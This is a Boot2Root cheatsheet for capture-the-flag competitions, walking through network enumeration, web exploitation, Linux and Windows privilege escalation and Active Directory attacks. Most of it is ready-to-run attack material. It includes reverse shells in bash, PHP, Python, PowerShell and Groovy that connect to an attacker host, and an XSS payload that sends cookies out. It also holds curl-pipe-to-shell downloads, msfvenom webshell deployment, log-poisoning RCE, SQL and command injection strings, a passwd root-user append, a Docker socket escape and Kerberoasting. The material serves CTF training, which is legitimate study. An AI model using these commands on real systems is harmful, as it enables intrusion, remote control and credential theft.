# Boot2Root Cheatsheet

## 1. Recon & Enumeration

**Nmap**
```bash
nmap -p- -T4 --min-rate=5000 -Pn <ip>
nmap -p<ports> -sC -sV -A -oN scan.txt <ip>
nmap -sU --top-ports 20 <ip>          # quick UDP sweep
```

**Web (HTTP/HTTPS)**
```bash
whatweb http://<ip>
nikto -h http://<ip>
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak
gobuster dns -d <domain> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
ffuf -u http://<ip>/FUZZ -w common.txt
```
- Always view page source, `/robots.txt`, `/sitemap.xml`, cookies, HTTP response headers
- Check for virtual hosts: add hostnames to `/etc/hosts` if a domain is found in certs/redirects
- Try default creds: admin/admin, admin/password, etc.

**SMB**
```bash
smbclient -L //<ip>/ -N
smbmap -H <ip>
enum4linux -a <ip>
smbclient //<ip>/<share> -N
```

**FTP**
```bash
ftp <ip>          # try anonymous:anonymous
wget -m ftp://anonymous:anonymous@<ip>   # mirror if anon allowed
```

**SSH** — rarely exploitable directly; check version for known CVEs (e.g. regreSSHion); focus on creds/keys found elsewhere.

**SNMP**
```bash
snmpwalk -c public -v1 <ip>
onesixtyone -c community.txt <ip>
```

**NFS**
```bash
showmount -e <ip>
mount -t nfs <ip>:/share /mnt/nfs
```

**Databases**
```bash
mysql -h <ip> -u root -p
psql -h <ip> -U postgres
redis-cli -h <ip>
```

**SMTP**
```bash
nc <ip> 25
VRFY root            # user enumeration if enabled
```

Always note: service name + exact version string — that's what you search for public exploits.

## 2. Service Exploitation Quick Hits

| Service | Easy wins to try first |
| --- | --- |
| FTP | Anonymous login; check for writable dirs (upload webshell if shared with web root) |
| SSH | Reused creds from web/db; weak/default creds; private keys found on another box |
| SMB | Null session (`-N`), guest access, writable shares, `.git`/backup files in shares, EternalBlue (MS17-010) if old Windows |
| MySQL/Postgres | root with blank/default password; `SELECT LOAD_FILE()` or `INTO OUTFILE` for file read/write if privileged |
| Redis | No auth by default — can write SSH key to `authorized_keys` or cron for RCE |
| SMTP | User enumeration via VRFY/RCPT; open relay |
| SNMP | Public/private community strings leak config, running processes, sometimes creds |
| Tomcat/Jenkins | Default creds (tomcat/tomcat, admin/admin); Jenkins script console = instant RCE |
| phpMyAdmin/CMS | Known CVEs for the exact version; default admin creds |

**Exploit lookup**
```bash
searchsploit <service> <version>
searchsploit -m <exploit-id>      # copy exploit locally
# web search engine is DuckDuckGo only -- no Google:
# <service> <version> exploit poc  (on duckduckgo.com)
```
Always read the exploit code before running it, and check for an `LHOST`/`RHOST` placeholder to edit.

**Metasploit shortcuts**
```bash
msfconsole -q
search <service> <version>
use exploit/...
set RHOSTS <ip>
set LHOST <tun0 ip>
run
```

## 3. Web Exploitation

**SQL Injection**
```sql
' OR '1'='1
' OR '1'='1' --  -
admin'--
' UNION SELECT null,null,null--   -- match column count
' UNION SELECT username,password,null FROM users--
```
```bash
sqlmap -u "http://<ip>/page?id=1" --dbs
sqlmap -u "http://<ip>/page?id=1" -D <db> -T <table> --dump
```

**LFI / RFI**
```
http://<ip>/index.php?page=../../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php   # read source
php://filter/convert.base64-encode/resource=config
```
LFI → RCE via log poisoning: inject PHP into User-Agent, then include `/var/log/apache2/access.log`.

**File upload bypass**
- Rename shell to `.php.jpg`, `.phtml`, `.php5`, or use double extensions
- Edit `Content-Type` header to `image/jpeg`
- Add magic bytes (`GIF89a;`) before PHP payload
- Null byte tricks on older PHP: `shell.php%00.jpg`

**Command Injection**
```bash
; id
| id
&& id
`id`
$(id)
```

**XSS** (for pivot/cookie theft challenges)
```html
<script>document.location='http://<your-ip>/?c='+document.cookie</script>
```

**Common CMS**
```bash
wpscan --url http://<ip> --enumerate u,p,t      # WordPress
droopescan scan joomla -u http://<ip>           # Joomla
```

**Other checks:** exposed `.git` (use `git-dumper` or `githack`), `.env` files, backup files (`.bak`, `~`, `.old`), API endpoints in JS files, JWT tampering (alg:none, weak secret via `hashcat`/`jwt_tool`).

## 4. Privilege Escalation

**Linux — run enumeration scripts first**
```bash
curl http://<your-ip>/linpeas.sh | sh     # or upload & run
./linenum.sh
```
Manual checks:
```bash
sudo -l                          # commands runnable as root
find / -perm -4000 -type f 2>/dev/null   # SUID binaries -> check GTFOBins
cat /etc/crontab; ls -la /etc/cron*       # cron jobs running as root
getcap -r / 2>/dev/null          # capabilities (e.g. cap_setuid on python)
uname -a; cat /etc/*release      # kernel/OS version -> known kernel exploits
ps aux | grep root               # root processes, check for writable configs/binaries
```
- SUID/sudo binary found → look it up on **GTFOBins**
- Writable `/etc/passwd` → add a new root user: `openssl passwd -1 pass` then append `hacker:<hash>:0:0::/root:/bin/bash`
- Check for reused passwords found earlier, `.bash_history`, config files with hardcoded creds

**Windows**
```powershell
winPEAS.exe
systeminfo            # OS build -> known kernel exploits (e.g. via Watson/Sherlock)
whoami /priv           # look for SeImpersonatePrivilege (PrintSpoofer/JuicyPotato), SeBackupPrivilege
icacls <file>          # writable services/binaries
reg query HKLM\SOFTWARE\...         # stored creds, AutoLogon
net user; net localgroup administrators
```
- `SeImpersonatePrivilege` → `PrintSpoofer.exe -i -c cmd` or JuicyPotatoNG
- Unquoted service paths / weak service permissions → `accesschk.exe` then replace binary
- Scheduled tasks running as SYSTEM with writable script → edit and wait/trigger

**General tip:** privesc in CTFs is almost always one of: SUID/sudo misconfig, cron job, kernel exploit, stored credentials, or a writable file/service running as a higher-privileged user. Check those in that order before reaching for a kernel exploit (riskier, can crash the box).

## 5. Shells, Transfers & One-Liners

**Listener**
```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444    # for stability
```

**Reverse shells**
```bash
bash -i >& /dev/tcp/<your-ip>/4444 0>&1
php -r '$sock=fsockopen("<your-ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<your-ip>",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object Net.Sockets.TCPClient("<your-ip>",4444);
```
Use revshells.com to pick one for the exact target language.

**Shell stabilization (Linux)**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then on attacker:
stty raw -echo; fg
reset
```

**File transfer**
```bash
# attacker (serve file):
python3 -m http.server 8000
# victim (Linux):
wget http://<your-ip>:8000/file
curl -O http://<your-ip>:8000/file
# victim (Windows):
certutil -urlcache -f http://<your-ip>:8000/file.exe file.exe
powershell -c "Invoke-WebRequest -Uri http://<your-ip>:8000/file -OutFile file"
# SCP back:
scp file user@<your-ip>:/tmp/
```

**Password cracking**
```bash
hydra -l user -P rockyou.txt ssh://<ip>
hashcat -m <mode> hash.txt rockyou.txt
john --wordlist=rockyou.txt hash.txt
john --show hash.txt
```
Common hashcat modes: 0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt, 13100=Kerberoast.

**Useful recon one-liners**
```bash
find / -writable -type d 2>/dev/null
find / -mmin -10 2>/dev/null
grep -r "flag{" / 2>/dev/null
```

## 6. Scenario Patterns

**Pattern: web app → LFI → RCE via log poisoning**
1. Find an LFI param (`?page=`, `?file=`, `?template=`)
2. Confirm with `../../../../etc/passwd`
3. Poison a log: set `User-Agent: <?php system($_GET['c']); ?>`, visit any page
4. Include the log: `?page=../../../../var/log/apache2/access.log&c=id`
5. Upgrade to reverse shell via the `c` param

**Pattern: CMS with known CVE**
1. `whatweb`/`wpscan` to fingerprint CMS + plugin versions
2. Match plugin/version to a CVE
3. Most plugin CVEs = auth bypass, SQLi, or arbitrary file upload → webshell → shell
4. Check `wp-config.php` (via LFI or backup) for DB creds — often reused for SSH

**Pattern: exposed .git repo**
```bash
wget -r http://<ip>/.git/
git-dumper http://<ip>/.git/ ./dump
cd dump && git log --all && git show <commit>
```

**Pattern: Jenkins / CI tool exposed**
- Unauthenticated/default creds → Manage Jenkins → Script Console → Groovy:
```groovy
String host="<your-ip>";int port=4444;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd,"-c","exec 5<>/dev/tcp/"+host+"/"+port+";cat <&5 | while read line; do \$line 2>&5 >&5; done").start();
```

**Pattern: SMB/Samba → creds in share → SSH/WinRM**
1. `smbclient -L` / `smbmap` to list shares anonymously
2. Download everything from readable shares, `grep -ri pass`
3. Reused creds often work over SSH, WinRM (`evil-winrm -i <ip> -u user -p pass`), or RDP

**Pattern: Windows AD box**
1. `nmap -p 88,389,445,5985` — Kerberos/LDAP/SMB/WinRM present = likely AD
2. Anonymous LDAP bind → enumerate users: `ldapsearch -x -H ldap://<ip> -b "dc=...,dc=..."`
3. Kerberoasting / AS-REP roasting: `GetUserSPNs.py domain/user:pass -dc-ip <ip> -request`, `GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip <ip>`
4. Crack with hashcat (mode 13100 / 18200)
5. `evil-winrm` or `psexec.py` in with recovered creds
6. BloodHound (`bloodhound-python`) to map privesc path to Domain Admin if chained

**Pattern: SUID binary privesc**
```bash
find / -perm -4000 2>/dev/null
# cross-reference every hit against https://gtfobins.github.io
```

**Pattern: cron job privesc**
1. `cat /etc/crontab`, `ls -la /etc/cron.*` — find a root-run script
2. Check if writable or uses a relative/unqualified path — PATH hijack it
3. Wait for the cron tick (or watch `pspy`)

**Pattern: Docker/container escape**
```bash
find / -iname '*.dockerenv*' 2>/dev/null
cat /proc/1/cgroup
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**Pattern: password reuse chain (multi-box CTF)**
- Every cred/hash/key recovered on box A — try against every service on boxes B–E before searching for a new exploit
- Keep a single `creds.txt`: `user:pass:source-box:service`
- SSH private keys found on one box almost always belong to a user on another

**General mindset:** enumeration is 80% of the box; the exploit is usually a known CVE or misconfig, not a 0day. Stuck >20-30 min → re-run full enumeration.

## 7. Step-by-Step Full Enumeration Playbook

Run this exact sequence on every box before touching an exploit.

**Step 1 — full TCP port sweep**
```bash
nmap -p- -T4 --min-rate=5000 -Pn -oN allports.txt <ip>
```
→ Collect every open port into a comma list for step 2.

**Step 2 — version/script scan on exactly those ports**
```bash
nmap -p<comma-list> -sC -sV -A -oN detailed.txt <ip>
```
→ Read every line. Note: exact service name, exact version, script output.

**Step 3 — quick UDP sweep**
```bash
nmap -sU --top-ports 20 -oN udp.txt <ip>
```
→ SNMP (161) or TFTP (69) open here is a common free info source.

**Step 4 — branch by port found**
- 80/443/8080/8443 open → Step 5 (web)
- 21 open → try anonymous FTP immediately
- 22 open only → note version, come back once you have creds
- 139/445 open → Step 6 (SMB)
- 3306/5432/6379/27017 open → go to section 2 table for that DB
- 25/465/587 open → VRFY/RCPT TO user enum, check open relay
- 88/389/464/3268 open with 445 → Active Directory (section 6 pattern)
- Anything unfamiliar → searchsploit + re-read the banner/version

**Step 5 — web enumeration sub-playbook**
1. `whatweb http://<ip>` — confirm server, language, frameworks
2. View page source; grep for comments, hidden fields, JS file names
3. `curl -s http://<ip>/robots.txt` and `/sitemap.xml`
4. `gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip,old -t 50`
5. Login form: try default creds → SQLi → registration page leaking users
6. CMS detected → CMS CVE pattern (section 6)
7. `nikto -h http://<ip>` as a second pass
8. Check `/.git/`, `/.env`, `/backup`, `/admin`, `/api` explicitly

**Step 6 — SMB enumeration sub-playbook**
1. `smbclient -L //<ip>/ -N`
2. `smbmap -H <ip>` — confirm read/write per share
3. `enum4linux -a <ip>` — users, groups, OS info, password policy
4. For every readable share: `smbclient //<ip>/<share> -N -c 'recurse ON; prompt OFF; mget *'`
5. `grep -ril "pass\|secret\|key" ./downloaded-share/`
6. Check OS build against MS17-010 if old unpatched Windows

**Step 7 — before moving to exploitation**
- Confirm: exact service+version for every port, creds/usernames found, files pulled
- Cross-check every version string against searchsploit and DuckDuckGo before writing custom exploit code

## 8. Extra Services Cheatsheet

**RDP (3389)**
```bash
xfreerdp /u:<user> /p:<pass> /v:<ip>
rdesktop -u <user> -p <pass> <ip>
hydra -l <user> -P rockyou.txt rdp://<ip>      # slow, last resort
```
Check `nmap -p 3389 --script rdp-ntlm-info <ip>` for pre-auth OS/hostname leak.

**WinRM (5985/5986)**
```bash
evil-winrm -i <ip> -u <user> -p '<pass>'
evil-winrm -i <ip> -u <user> -H '<ntlm-hash>'   # pass-the-hash
```
Inside evil-winrm: `upload`/`download`, `menu` for modules (Invoke-Binary, Bypass-4MSI).

**VNC (5900)**
```bash
vncviewer <ip>::5900
nmap -p 5900 --script vnc-info,realvnc-auth-bypass <ip>
hydra -P rockyou.txt vnc://<ip>
```

**Telnet (23)**
```bash
telnet <ip>
hydra -l <user> -P rockyou.txt telnet://<ip>
```
Try default vendor creds first on IoT/embedded boxes.

**Elasticsearch (9200)**
```bash
curl http://<ip>:9200/_cat/indices?v
curl http://<ip>:9200/<index>/_search?pretty
```
No auth by default on old versions; check against CVE-2015-1427, CVE-2014-3120.

**MongoDB (27017)**
```bash
mongo --host <ip> --port 27017
show dbs
use <db>
show collections
db.<collection>.find().pretty()
```

**Docker API (2375/2376)**
```bash
docker -H tcp://<ip>:2375 ps
docker -H tcp://<ip>:2375 images
docker -H tcp://<ip>:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
```
Unauthenticated exposed Docker daemon = instant root-equivalent host access.

**IPMI (623/UDP)**
```bash
nmap -sU -p 623 --script ipmi-version <ip>
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <ip>; run"
```

**Rsync (873)**
```bash
rsync -av --list-only rsync://<ip>/
rsync -av rsync://<ip>/<module> ./loot/
```

**Tomcat Manager (8080)**
```bash
# default creds: tomcat/tomcat, admin/admin, tomcat/s3cret
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your-ip> LPORT=4444 -f war > shell.war
curl --upload-file shell.war -u tomcat:tomcat "http://<ip>:8080/manager/text/deploy?path=/shell"
curl http://<ip>:8080/shell/
```

**Kibana / Grafana (5601 / 3000)**
- Grafana: CVE-2021-43798 (arbitrary file read via plugin path traversal)
- Kibana: CVE-2019-7609 (Timelion RCE); default creds often `elastic`/`changeme`

**IIS (80/443, Windows)**
```bash
nmap -p80,443 --script http-iis-webdav-vuln <ip>
curl -T shell.aspx "http://<ip>/shell.aspx" --http1.1   # WebDAV PUT upload
# check iis_shortname_scanner for the tilde ~1 bug
```

## 9. Master Walkthrough — Start to Finish (OS-agnostic, modular)

You won't know if a box is Linux or Windows until the port scan comes back, so this starts OS-agnostic (Part A), then splits into Linux (Part B) and Windows (Part C). Every step: what it's for → a quick check so the tool actually runs → the tools → the exact script → what to do with the result.

### Part A — OS-agnostic start (every box, every time)

**A1. Confirm the VPN tunnel is up**
- *Why:* a down tunnel gives confusing errors later instead of an obvious VPN error.
- *Check:* `ip a show tun0` should print an IP.
```bash
sudo openvpn user.ovpn &
sleep 5
ip a show tun0
ping -c 3 <target-ip>
```
→ No ping but tun0 has an IP: target may block ICMP — go to A2 to confirm via TCP instead.

**A2. Full TCP port discovery**
- *Check:* `which nmap`.
```bash
nmap -p- -T4 --min-rate=5000 -Pn -oN allports.txt <target-ip>
```
→ Zero ports: recheck IP/VPN. Something open: A3.

**A3. Version/script scan + UDP sweep**
```bash
ports=$(grep -oP '^\d+(?=/tcp.*open)' allports.txt | paste -sd,)
nmap -p$ports -sC -sV -A -oN detailed.txt <target-ip>
nmap -sU --top-ports 20 -oN udp.txt <target-ip>
```
→ Read `detailed.txt` fully — this decides everything downstream.

**A4. Decide the OS**
- **Likely Windows:** 135, 139, 445 (SMB), 3389 (RDP), 5985/5986 (WinRM), 88/389/464 (AD)
- **Likely Linux:** 22 (SSH) with no Windows ports, or Apache/Nginx `Server:` header
- **Ambiguous (web-only):** doesn't matter yet — go to A5

**A5. Web enumeration (either OS)**
- *Check:* `curl -I http://<target-ip>:<port>` returns real headers.
```bash
whatweb http://<target-ip>
curl -s http://<target-ip>/robots.txt
curl -s http://<target-ip>/sitemap.xml
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt -x php,asp,aspx,txt,html,bak,zip -t 50 -o gobuster.txt
nikto -h http://<target-ip> -output nikto.txt
```
→ `.php`/Apache/Nginx header → Linux backend. `.aspx`/IIS header → Windows backend.

**A6. Exploit lookup prep**
- *Check:* confirm the EXACT version string.
```bash
searchsploit <service-name> <version>
searchsploit -m <exploit-id>
```
- Web search is **DuckDuckGo only** (no Google): `<service> <version> exploit` / `<service> <version> CVE` on duckduckgo.com
- *Before running any copied exploit:* read it end to end — confirm clearly marked RHOST/LHOST/PORT variables and nothing destructive.

→ Once OS confirmed and exploit/path identified → Part B (Linux) or Part C (Windows).

### Part B — Linux target

**B1. Pick the foothold path**
- Web app with a param (LFI/SQLi/upload) → B1a
- SMB share readable/writable → B1b
- FTP anonymous → B1c
- A CVE'd service version with a public exploit → B1d

**B1a. Web param exploitation**
```bash
curl "http://<target-ip>/index.php?page=../../../../etc/passwd"          # LFI test
curl "http://<target-ip>/page.php?id=1'"                                  # SQLi test
sqlmap -u "http://<target-ip>/page.php?id=1" --batch --dbs
```
*Check before log-poisoning LFI→RCE:* confirm web root user can read the log path — `curl -I` to see `Server:` header first (Apache vs Nginx differ).
```bash
curl -s -A "<?php system(\$_GET['c']); ?>" http://<target-ip>/
curl "http://<target-ip>/index.php?page=../../../../var/log/apache2/access.log&c=id"
```

**B1b. SMB loot**
```bash
smbclient -L //<target-ip>/ -N
smbmap -H <target-ip>
enum4linux -a <target-ip>
```
*Check before mget:* confirm the share is actually readable (smbmap shows READ/WRITE).

**B1c. FTP anonymous**
```bash
ftp <target-ip>          # user: anonymous, pass: anything/blank
wget -m --no-passive ftp://anonymous:anonymous@<target-ip>
```

**B1d. Known-CVE exploit**
*Check first:* listener must be up BEFORE triggering the exploit.
```bash
nc -lvnp 4444 &
searchsploit -m <exploit-id>
python3 <exploit-script>.py <target-ip> 4444 <your-ip>   # args vary, read usage/help
```

**B2. Stabilize the shell**
*Check first:* `python3 --version`; if missing try `script -qc /bin/bash /dev/null` instead.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then on YOUR terminal:
stty raw -echo; fg
reset
```

**B3. Low-priv loot**
```bash
whoami; id; hostname; uname -a; cat /etc/os-release
cat /etc/passwd
find / -user "$(whoami)" -type f 2>/dev/null | grep -v '^/proc'
cat ~/.bash_history 2>/dev/null
grep -ril "pass\|secret\|key" /var/www /opt /home 2>/dev/null
```

**B4. Privilege escalation (priority order)**
*Check first:* if `sudo -l` hangs asking for a password, Ctrl+C rather than guessing blind.
```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null         # SUID
cat /etc/crontab; ls -la /etc/cron.*           # cron
getcap -r / 2>/dev/null                        # capabilities
uname -a                                       # kernel, last resort
```
*Before linpeas:* confirm outbound access — `curl http://<your-ip>:8000/` should return something, not timeout.
```bash
python3 -m http.server 8000   # attacker
curl http://<your-ip>:8000/linpeas.sh | sh > /tmp/out.txt 2>&1; cat /tmp/out.txt   # victim
```
→ Match every SUID/sudo/capability hit against **GTFOBins** before a kernel exploit (can crash the box).

**B5. Capture**
```bash
cat /root/root.txt
cat /home/*/user.txt
```

### Part C — Windows target

**C1. Pick the foothold path**
- *Check first:* 88/389/464 open alongside 445 = Active Directory → C1d.
- SMB share readable/anonymous → C1a
- RDP/WinRM with found creds → C1b
- Web app on IIS → C1c
- Active Directory → C1d

**C1a. SMB on Windows**
*Check first:* `nmap --script smb-os-discovery,smb2-security-mode -p445 <target-ip>`.
```bash
smbclient -L //<target-ip>/ -N
smbmap -H <target-ip>
nmap --script smb-vuln-ms17-010 -p445 <target-ip>
```
→ Vulnerable to MS17-010 → `msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <target-ip>; set LHOST <your-ip>; run"`.

**C1b. RDP / WinRM with creds**
*Check first:* confirm creds belong to this box (not another from your shared creds.txt) — repeated wrong attempts can trigger AD lockout.
```bash
evil-winrm -i <target-ip> -u <user> -p '<pass>'
evil-winrm -i <target-ip> -u <user> -H '<ntlm-hash>'   # pass-the-hash
xfreerdp /u:<user> /p:'<pass>' /v:<target-ip> +clipboard   # if WinRM isn't open
```

**C1c. IIS / web app**
*Check first:* `curl -I http://<target-ip>` confirms `Microsoft-IIS` header.
```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt -x asp,aspx,txt,config -t 50
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your-ip> LPORT=4444 -f aspx -o shell.aspx
```

**C1d. Active Directory sub-path**
*Check first:* `ldapsearch -x -H ldap://<target-ip> -b "" -s base` with no creds to see if anonymous bind is allowed.
```bash
ldapsearch -x -H ldap://<target-ip> -b "dc=<domain>,dc=<tld>"
crackmapexec smb <target-ip> --users
GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <target-ip> -format hashcat   # AS-REP roast
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <target-ip> -request                           # Kerberoast
hashcat -m 18200 asrep_hashes.txt rockyou.txt
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt
```
→ Cracked creds → back to C1b with the new account.

**C2. Low-priv loot**
```powershell
whoami /all
systeminfo
net user
net localgroup administrators
dir /s /b C:\Users\*.txt C:\Users\*.config 2>nul
type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 2>nul
```

**C3. Privilege escalation (priority order)**
*Check first:* if `whoami /priv` is blocked (some webshells restrict it), get a full reverse shell first.
```powershell
whoami /priv
```
→ `SeImpersonatePrivilege` present → PrintSpoofer/JuicyPotatoNG:
```powershell
PrintSpoofer.exe -i -c cmd
```
*Before winPEAS:* confirm an upload path (SMB write, web upload, or certutil) — test with a small file first if unsure.
```powershell
certutil -urlcache -f http://<your-ip>:8000/winPEAS.exe winPEAS.exe
.\winPEAS.exe
```
→ Also check: unquoted service paths, weak service permissions (`accesschk.exe -uwcqv <service>`), AlwaysInstallElevated, scheduled tasks as SYSTEM with writable script.

**C4. Capture**
```powershell
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\<user>\Desktop\user.txt
```

### Part D — Edge cases, dead ends, and when to pivot

**Tool fails/errors immediately:**
- Read the actual error — "Connection refused" / "timed out" / "permission denied" each need a different fix.
- `which <tool>` first if unsure it's installed.

**Port scan looks empty/wrong:**
- Re-run with `-Pn` and `--reason`.
- Confirm you're scanning the right IP.

**Known exploit doesn't land:**
- Re-check the exact version (point releases matter).
- Re-check LHOST is the `tun0` IP.
- AV/firewall may block known msfvenom signatures — try an encoded payload or different type.
- Try manual script vs Metasploit module, or vice versa.

**Stuck 20–30 min with no foothold:**
- Re-run full enumeration (section 7) — something was likely missed.
- Re-read collected banner/version text — the answer is usually already in your notes.
- Check a service you dismissed early.

**Got a shell but can't privesc:**
- Confirm you actually read linpeas/winPEAS's highlighted output.
- Check creds reused from elsewhere in the competition.
- Re-check `sudo -l`/SUID after exploring more of the filesystem.
- Kernel exploit matched exactly to `uname -a` — last resort only, risk of crashing the box.

**Multi-box chain (your exact setup):**
- Every cred/key/hash recovered gets tried against every other box's services before a new exploit search.
- Keep flags, creds, and exploit notes in one running file.

## 10. Generic Exploitation Walkthrough Template

**A. Foothold checklist**
- [ ] Exact vulnerable service + version confirmed
- [ ] Matching public exploit found and read fully before running
- [ ] Listener started: `nc -lvnp 4444`
- [ ] Exploit run with correct LHOST (tun0 IP) and RHOST
- [ ] Shell caught → stabilize it
- [ ] `whoami`, `id`, `hostname`, `uname -a` recorded

**B. Low-priv loot checklist**
- [ ] `cat /etc/passwd` — all local users
- [ ] `find / -user $(whoami) -type f 2>/dev/null | grep -v proc`
- [ ] Other users' home directories for readable files
- [ ] `history`/`.bash_history`
- [ ] Config files with embedded creds (`.env`, `config.php`, `wp-config.php`, `web.config`)
- [ ] SSH keys lying around

**C. Privilege escalation checklist (priority order)**
- [ ] `sudo -l` → NOPASSWD/custom binary → GTFOBins
- [ ] SUID binaries → GTFOBins for each non-standard one
- [ ] Cron jobs: writable script running as root
- [ ] Capabilities (`getcap -r /`)
- [ ] Kernel/OS version → known local kernel exploit (last resort)
- [ ] Run linpeas.sh, read highlighted output top to bottom

**D. Root/flag checklist**
- [ ] `cat /root/root.txt`
- [ ] Record creds/exploit chain in notes
- [ ] Copy creds/keys into shared `creds.txt` before moving on

**SQL injection checklist**
- [ ] Confirm injectable param (`'`/`"` causes error/behavior change)
- [ ] Column count via `ORDER BY N--` or `UNION SELECT NULL...--`
- [ ] Identify DB type from error messages
- [ ] Dump schema, then creds
- [ ] If blind: confirm with `AND 1=1--` vs `AND 1=2--`, automate with sqlmap

**File upload checklist**
- [ ] Try `.php`, `.php5`, `.phtml`, `.pht`
- [ ] Double extension `shell.php.jpg`
- [ ] Case variation `shell.PHP`
- [ ] Change `Content-Type` header
- [ ] Magic bytes prefix `GIF89a;`
- [ ] Confirm where the file lands and whether it executes

**LFI checklist**
- [ ] Confirm traversal depth with `/etc/passwd`
- [ ] PHP wrappers to read source
- [ ] Check log poisoning path (Apache/Nginx)
- [ ] `/proc/self/environ` as alternate injection point
- [ ] Session file poisoning if PHP session-based

**Active Directory checklist**
- [ ] Anonymous LDAP bind or null session SMB for user list
- [ ] AS-REP roast no-preauth accounts
- [ ] Kerberoast once you have any valid creds
- [ ] Password-spray one common password (watch lockout policy)
- [ ] BloodHound for AS-REP roastable / GenericAll / WriteDACL misconfig
